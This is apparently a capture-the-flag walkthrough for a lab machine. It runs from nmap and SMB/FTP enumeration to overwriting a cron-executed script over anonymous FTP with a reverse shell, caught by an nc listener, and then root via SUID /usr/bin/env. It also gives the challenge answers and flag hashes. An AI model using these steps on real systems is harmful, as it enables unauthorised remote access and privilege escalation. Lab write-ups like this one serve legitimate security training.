# Nmap Scanning

Let's start with nmap scanning using this command

```

nmap -sC -sV -T4 "IP"

```



```

PORT    STATE SERVICE     VERSION

21/tcp  open  ftp         vsftpd 2.0.8 or later

| ftp-syst: 

|   STAT: 

| FTP server status:

|      Connected to ::ffff:10.11.41.47

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit

|      Session timeout in seconds is 300

|      Control connection is plain text

|      Data connections will be plain text

|      At session startup, client count was 2

|      vsFTPd 3.0.3 - secure, fast, stable

|_End of status

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]

22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)

|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)

|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel



Host script results:

| smb-security-mode: 

|   account_used: guest

|   authentication_level: user

|   challenge_response: supported

|_  message_signing: disabled (dangerous, but default)

| smb2-time: 

|   date: 2023-06-05T15:37:32

|_  start_date: N/A

| smb-os-discovery: 

|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)

|   Computer name: anonymous

|   NetBIOS computer name: ANONYMOUS\x00

|   Domain name: \x00

|   FQDN: anonymous

|_  System time: 2023-06-05T15:37:32+00:00

| smb2-security-mode: 

|   311: 

|_    Message signing enabled but not required

|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

```

we got this result as we can see there is 4 ports open

- ftp 21 --> ==anonymous FTP login allowed==

- SSH 22

- 139 SMB

- 445 SMB

**Q1**: How many ports are open?

A1:4

**Q2**: What services is running on port 21

A2: FTP

**Q3**: What service is running on ports 139 and 445?

A3: SMB



--------------------------------------------------------

# Enumerating

Fourth question ask for share -SMB- so we need to list all shares on #SMB using this command  [a good reference for smb enumaration](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)

```

smbmap -H $IP

```

![](https://i.imgur.com/WDzlXvi.png)

**Q4**:There's a share on the user's computer.  What's it called?

A4:pics



now let's start get access to the machine. as we saw earlier that FTP allowed the anonymous login which mean that we can join ftp with user: anonymous and without password. let's try that

```

ftp "IP MACHINE"

```

![](https://i.imgur.com/yrECtbx.png)

as we can see in the picture there is directory call scripts. enter it

```

cd scripts

ls

```

![](https://i.imgur.com/hbPoGGP.png)

interesting. download these files to your machine using

```

mget *

```

![](https://i.imgur.com/T3gsvZH.png)

type exit and check what these files contain?

![](https://i.imgur.com/cbGwR7g.png)

nothing seems interesting in this file.

![](https://i.imgur.com/EwXIDKs.png)

that's a log display a message. until now it is not interested.

![](https://i.imgur.com/D8kXvVl.png)

now we got it. this is cronjob. it is executing itself, if there is no files he will display a message in removed_files.log .

after we know that a cronjob , what if we create a file at the same name, type our commands. and upload it to ftp. the machine will execute our file thinking that the original script.











# Exploiting

let's try that

```bash

rm clean.sh #removing the file

nano clean.sh #creating a new file with the samename

```

so what if we type a command that gives us a reverse shell? #reverse_shell

u can add your own reverse shell but I will use this website [Revshell](https://www.revshells.com/)

![](https://i.imgur.com/Qiy1NQc.png)



copy it. and paste it on clean.sh, save the file.

![](https://i.imgur.com/scDmRD4.png)

that what the file will look like.

start a listener on your local machine

```

nc -lvp 4444

```

then enter the ftp #ftp

```

ftp 10.10.235.16

cd scripts

```

after that type to upload the file to ftp

```

put clean.sh

```

go back to the listener. wait and you will get a connection.

![](https://i.imgur.com/xeoY9YZ.png)

**Q4**:user.txt

A4:90d6f992585815ff991e68748c414740



-------------------------------

# Privilege Escalation 

fifth question asks for root.txt so we want to escalate our privilege.

try "sudo -l" and it won't work. so we will try suid. #Linux_privilege_escalation 

by typing this command [Privilege Escalation](Linux.md)

```

find / -perm -4000 -type f -ls 2>/dev/null

```



![](https://i.imgur.com/m4NeIoa.png)

all seems built-in in Linux. except /usr/bin/env . that we can search for it in GTFObins. ==first time. it's hard to identify SUID that u can escalate your privilege by it. but by practice u can identify it quickly. 

![](https://i.imgur.com/vTPfTdA.png)



![](https://i.imgur.com/4BsqOF6.png)

so we will skip the first command because we know the env path. type this

```

/usr/bin/env /bin/sh -p

```

![](https://i.imgur.com/YJDCI1x.png)

and now we are root.

```

cat /root/root.txt

```

**Q5:** root.txt

A5:4d930091c31a622a7ed10f27999af363

















